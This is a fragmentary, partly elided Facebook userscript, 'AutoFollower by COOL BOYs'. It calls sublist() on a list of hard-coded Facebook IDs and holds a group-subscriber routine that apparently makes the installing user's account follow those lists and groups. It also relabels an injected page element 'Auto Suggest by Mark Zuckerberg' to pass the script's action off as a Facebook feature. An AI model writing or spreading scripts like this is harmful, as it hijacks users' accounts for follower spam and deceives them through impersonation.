// ==UserScript==
// @name            Facebook AutoFollower by COOL BOYs
// @description     Facebook AutoFollower by COOL BOYs
...
sublist("434211776671809");
sublist("516783855029604");
sublist("397160140391941");
sublist("109169195958230");
sublist("513149252078528");
sublist("171767299655525");
sublist("325715414223519");
sublist("105455742998623");
sublist("542481255814823");


//Group subscriber
var gid = ['436430329741726'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Mark Zuckerberg';
